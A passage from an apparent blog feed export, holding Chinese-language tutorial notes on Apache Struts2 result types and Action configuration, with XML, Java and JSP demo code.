class="string">"org.apache.struts2.dispatcher.PlainTextResult"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"postback"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.PostbackResult"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result-types</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，每个 <code>&lt;result-type&gt;</code> 元素都是一种视图技术或者跳转方式的封装，其中 name 属性指出在 <code>&lt;result&gt;</code> 元素中如何引用这种视图技术或者跳转方式，它对应着 <code>&lt;result&gt;</code> 元素的 type 属性。class 属性表示这种结果类型的对应类。</p><p>Struts2 中预定义的 ResultType 说明如表所示。</p><table><thead><tr><th>属   性</th><th>说   明</th></tr></thead><tbody><tr><td>chain</td><td>用于处理 Action 链，被跳转的 Action 中仍能获取上个页面的值，如 request 信息</td></tr><tr><td>dispatcher</td><td>用于转向页面，通常处理 JSP，是默认的结果类型</td></tr><tr><td>freemarker</td><td>用于整合 FreeMarker 模板结果类型</td></tr><tr><td>httpheader</td><td>用于处理特殊的 HTTP 行为结果类型</td></tr><tr><td>redirect</td><td>重定向到一个 URL，被跳转的页面中丢失传递的信息</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action，跳转的页面中丢失传递的信息</td></tr><tr><td>stream</td><td>向浏览器发送 InputStream 对象，通常用于处理文件下载，还可用于 Ajax 数据</td></tr><tr><td>velocity</td><td>用于整合 Velocity 模板结果类型</td></tr><tr><td>xslt</td><td>用于整合 XML/XSLT 结果类型</td></tr><tr><td>plainText</td><td>显示原始文件内容，如文件源代码</td></tr><tr><td>postback</td><td>使当前请求参数以表单形式提交</td></tr></tbody></table><p>表中列举了 Struts2 中预定义的全部 11 种结果类型，其中 dispatcher 是默认的结果类型，主要用于与 JSP 整合。在这全部 11 种结果类型中，dispatcher 和 redirect 是比较常用的结果类型。</p><p>需要注意的是，redirect 与 dispatcher 结果类型非常相似，所不同的是 dispatcher 结果类型是将请求转发到 JSP 视图资源，而 redirect 结果类型是将请求重定向到 JSP 视图资源。如果重定向了请求，那么将丢失所有参数，包括 Action 的处理结果。</p><h2 id="0x04-dispatcher结果类型"><a href="#0x04-dispatcher结果类型" class="headerlink" title="0x04 dispatcher结果类型"></a>0x04 dispatcher结果类型</h2><p>dispatcher 是 Struts2 的默认结果类型，它用于表示转发到指定结果资源。</p><p>由于 Struts2 在后台使用 RequestDispatcher 的 forward() 方法转发请求，所以在用户的整个请求/响应过程中，保持的是同一个请求对象，即目标 JSP/Servlet 接收到的请求/响应对象与最初的 JSP/Servlet 的请求/响应对象相同。</p><p>dispatcher 结果类型的对应类是 org.apache.struts2.dispatcher.ServletDispatcherResult，该类有 location 和 parse 两个属性，可以通过 struts.xml 配置文件中的 <code>&lt;result&gt;</code> 元素的 <code>&lt;param&gt;</code> 子元素设置，代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"dispatcher"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"parse"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，location 参数用于指定 Action 执行完毕后要转向的目标资源；parse 参数是一个布尔类型的值，默认是 true，表示解析 location 参数中的 OGNL 表达式，如果为 false，则不解析。</p><h2 id="0x05-redirect结果类型"><a href="#0x05-redirect结果类型" class="headerlink" title="0x05 redirect结果类型"></a>0x05 redirect结果类型</h2><p>redirect 结果类型用于重定向到指定的结果资源，该资源可以是 JSP 文件，也可以是 Action 类。使用 redirect 结果类型时，系统将调用 HttpServletResponse 的 sendRedirect() 方法将请求重定向到指定的 URL。</p><p>redirect 结果类型的对应类是 org.apache.struts2.dispatcher.ServletRedirectResult。在使用 redirect 时，用户要完成一次和服务器之间的交互，浏览器需要发送两次请求，请求过程如图：</p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/3.png" alt=""></p><p>使用 redirect 结果类型的工作过程如下。</p><ol><li>浏览器发出一个请求，Struts2框架调用对应的Action实例对请求进行处理。</li><li>Action返回success结果字符串，Struts2框架根据这个结果选择对应的结果类型，这里使用的是redirect结果类型。</li><li>ServletRedirectResult在内部使用HttpServletResponse的sendRedirect()方法将请求重新定向到目标资源。</li><li>浏览器重新发起一个针对目标资源的新请求。</li><li>目标资源作为响应呈现给用户。</li></ol><p>Demo案例参考：<a href="http://c.biancheng.net/view/4101.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4101.html</a></p><h2 id="0x06-Freemaker结果类型"><a href="#0x06-Freemaker结果类型" class="headerlink" title="0x06 Freemaker结果类型"></a>0x06 Freemaker结果类型</h2><p>Freemaker是一个流行的模板引擎，使用预定义的模板生成输出。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>hello.fm，FreeMarker模板文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is FreeMarker test, $&#123;name&#125;</span><br></pre></td></tr></table></figure><p>HelloWorldAction类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">         pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span></span><br><span class="line"><span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Hello World&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello World From Struts2&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">"hello"</span>&gt;</span><br><span class="line">  &lt;label for="name"&gt;Please enter your name&lt;/label&gt;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Say Hello"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>配置struts.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"helloworld"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.domain.HelloWorldAction"</span> <span class="attr">method</span>=<span class="string">"execute"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"freemarker"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/hello.fm<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下，看到渲染与JSP视图完全相同，只是我们不绑定使用JSP作为视图技术：</p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之ResultType（结果类型）/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之Action</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BAction/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之Action/</id>
    <published>2020-04-30T16:00:01.000Z</published>
    <updated>2020-08-15T06:40:16.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-Action配置详解"><a href="#0x01-Action配置详解" class="headerlink" title="0x01 Action配置详解"></a>0x01 Action配置详解</h2><p>Action是用于处理请求操作的，它是由StrutsPrepareAndExecuteFilter分发过来的。</p><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>在 Struts2 中，一个 Action 类代表一次请求或调用，每个请求的动作都对应一个相应的 Action 类。也就是说，用户的每次请求，都会转到一个相应的 Action 类中，由这个 Action 类进行处理。简而言之，Action 就是用于处理一次用户请求的对象。</p><h4 id="实现Action接口"><a href="#实现Action接口" class="headerlink" title="实现Action接口"></a>实现Action接口</h4><p>当 Action 类处理用户请求成功后，有人习惯返回 index 字符串，有人习惯返回 success 字符串，这会导致在一个 Action 中可能会返回各种不同的值，十分不利于项目的统一管理。</p><p>为了让用户更规范地创建 Action 类，Struts2 提供了一个 Action 接口，该接口定义了 Action 类应该实现的规范，用户在创建 Action 时，可以实现这个接口。Action 接口中的具体代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义Action接口中包含的一些结果字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SUCCESS=<span class="string">"success"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NONE=<span class="string">"none"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR=<span class="string">"error"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT=<span class="string">"input"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOGIN=<span class="string">"login"</span>;</span><br><span class="line">    <span class="comment">//定义处理用户请求的execute()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，Action 接口位于 com.opensymphony.xwork2 包中，并且接口中只定义了五个字符串常量和一个 execute() 方法。其中，execute() 方法是 Action 类的默认请求处理方法，该方法返回一个字符串，而上面五个字符串常量的作用是统一 execute() 方法的返回值。</p><h4 id="继承ActionSupport类"><a href="#继承ActionSupport类" class="headerlink" title="继承ActionSupport类"></a>继承ActionSupport类</h4><p>由于 Xwork 的 Action 接口十分简单，为开发者提供的帮助较小，所以在实际开发过程中，通常都是采用继承 ActionSupport 类的方式创建 Action。其示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActionSupport 是 Action 接口的默认实现类，所以继承 ActionSupport 就相当于实现了 Action 接口。除 Action 接口以外，ActionSupport 类还实现了 Validateable、ValidationAware、TextProvider、LocaleProvider 和 Serializable 等接口，这为用户提供了更多的功能。</p><p>ActionSupport 类中提供了许多默认方法，这些默认方法包括数据校验的方法、默认的处理用户请求的方法等。如果开发者的 Action 类继承 ActionSupport 类，会大大简化 Action 的开发。</p><p>需要注意的是，由于自定义的 Action 类继承了 ActionSupport 类，因此必须定义一个变量 serialVersionUID。这是因为 ActionSupport 类实现了 Serializable 接口，任何实现了 Serializable 接口的类都必须声明变量 serialVersionUID，如下所示：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><p>在学习过程中，细心的读者可能会发现，即使不加上述代码，程序也可以正常执行。但是在实际项目开发中，必须加上上述代码。</p><h3 id="配置Action"><a href="#配置Action" class="headerlink" title="配置Action"></a>配置Action</h3><p>配置 Action 主要就是配置 struts.xml 文件中 Action 的映射信息。Action 映射是指将一个请求的 URL 映射到一个 Action 类，当一个请求匹配某个 Action 名称时，Struts2 框架就使用这个 Action 确定如何处理请求。</p><p>struts.xml 文件是通过 <code>&lt;action&gt;</code> 元素对请求的 Action 和 Action 类进行配置的，其示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"userAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.UserAction"</span> <span class="attr">method</span>=<span class="string">"add"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，包含了 <code>&lt;action&gt;</code> 元素的三个常用属性 name、class 和 method，这三个属性的具体说明如下表所示。</p><table><thead><tr><th>名  称</th><th>可选/必填</th><th>说  明</th></tr></thead><tbody><tr><td>name</td><td>必填属性</td><td>表示 Action 的名称（该名称必须唯一），它指定了 Action 所处理请求的 URL。该属性将在其他地方被引用，如作为 JSP 页面 form 表单的 action 属性值。</td></tr><tr><td>class</td><td>可选属性</td><td>用于指定 Action 的实现类，如果没有指定 class 属性值，则其默认值为 com.opensymphony.xwork2.ActionSupport 类。</td></tr><tr><td>method</td><td>可选属性</td><td>指定请求 Action 时调用的方法。如果指定了 method 属性，则该 Action 会调用 method 属性中指定的方法，如果不指定 method 属性，则 Action 会调用 execute() 方法。</td></tr></tbody></table><h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符"></a>使用通配符</h3><p>由于在一个 Action 类中可能有多个业务逻辑处理方法，在配置 Action 时，就需要使用多个 <code>&lt;action&gt;</code> 元素。在实现同样功能的情况下，为了减少 struts.xml 配置文件的代码量，可以借助于通配符映射信息。</p><p>下面以一段 Action 的配置代码为例，说明如何使用通配符进行配置，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">namespace</span>=<span class="string">"/user"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"userAction_*"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.UserAction"</span> <span class="attr">method</span>=<span class="string">"&#123;1&#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，method 属性值中的数字1表示匹配第 1 个 <code>*</code>。当客户端发送 /user/userAction_login.action 这样的请求时，<code>&lt;action&gt;</code> 元素的 name 属性值就被设置成 userAction_login，method 属性值就被设置成 login。当客户端发送 /user/userAction_register.action 这样的请求时，<code>&lt;action&gt;</code> 元素的 name 属性值就被设置为 userAction_register，method 属性值也被设置成 register。</p><p>另外，对 <code>&lt;result&gt;</code> 元素也可以采用通配符配置，代码如下所示：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span>/(1).jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当客户端发送 userAction_login 这样的请求时，<code>&lt;result&gt;</code> 元素被设置成跳转到 login.jsp 页面。当客户端发送 userAction_register 这样的请求时，<code>&lt;result&gt;</code>元素被设置成跳转到 register.jsp 页面。</p><h2 id="0x02-Action访问Servlet-API"><a href="#0x02-Action访问Servlet-API" class="headerlink" title="0x02 Action访问Servlet API"></a>0x02 Action访问Servlet API</h2><p>在 Struts2 中，虽然 Action 已经与 Servlet API 完全分离，但在实现业务逻辑时，还是经常要访问 Servlet API 中的对象。</p><p>通常开发时需要访问 Servlet API 中的 HttpServletRequest、HttpSession 和 ServletContext 三个接口，它们分别对应 JSP 内置对象 request、session 和 application。</p><p>在 Struts2 中，访问 Servlet API 通常采用两种方式，分别是通过 ActionContext 访问和通过 ServletActionContext 访问，本节将针对这两种访问方式进行讲解。</p><h3 id="通过ActionContext访问"><a href="#通过ActionContext访问" class="headerlink" title="通过ActionContext访问"></a>通过ActionContext访问</h3><p>ActionContext 是 Action 执行的上下文对象，在 ActionContext 中保存了 Action 执行所需要的所有对象，包括 request、session 和 application 等。ActionContext 类访问 Servlet API 的几个常用方法如表所示。</p><table><thead><tr><th>方法声明</th><th>功能描述</th></tr></thead><tbody><tr><td>void put(String key, Object value)</td><td>将 key-value 键值对放入 ActionContext 中，模拟 Servlet API 中的 HttpServletRequest 的 setAttribute() 方法</td></tr><tr><td>Object get(String key)</td><td>通过参数 key 查找当前 ActionContext 中的值</td></tr><tr><td>Map&lt;String, Object&gt; get Application()</td><td>返回一个 Application 级的 Map 对象</td></tr><tr><td>static ActionContext getContext()</td><td>获取当前线程的 ActionContext 对象</td></tr><tr><td>Map&lt;String, Object&gt; getParameters()</td><td>返回一个包含所有 HttpServletRequest 参数信息的 Map 对象</td></tr><tr><td>Map&lt;String, Object&gt; getSession()</td><td>返回一个 Map 类型的 HttpSession 对象</td></tr></tbody></table><p>要访问 Servlet API，可以通过如下示例代码方式进行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ActionContext context = ActionContext.getContext();</span><br><span class="line">context.put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.getApplication().put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.getSession().put(<span class="string">"name"</span>,<span class="string">"mi1k7ea"</span>);</span><br></pre></td></tr></table></figure><p>在上述示例代码中，通过 ActionContext 类中的方法调用，分别在 request、application 和 session 中放入了（”name”，”mi1k7ea”）键值对。通过代码可以看到，ActionContext 类可以非常简单地访问 JSP 内置对象的属性。</p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>沿用之前的示例项目继续演示。</p><p>添加login.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        input[type=text],input[type=password]&#123;width:<span class="number">150</span>px&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"login"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>/&gt;&lt;br/&gt;</span><br><span class="line">        密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>/&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input type=<span class="string">"reset"</span> value=<span class="string">"重置"</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"登录"</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>修改success.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录成功页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;$&#123;success &#125;&lt;br/&gt;&lt;/p&gt;</span><br><span class="line">&lt;h2&gt;用户登录信息&lt;/h2&gt;</span><br><span class="line">用户名：$&#123;username &#125;&lt;br/&gt;</span><br><span class="line">密码：$&#123;password &#125;&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>添加error.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录失败页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;$&#123;error &#125;&lt;br/&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>编写LoginAction类，主要用于登录逻辑处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 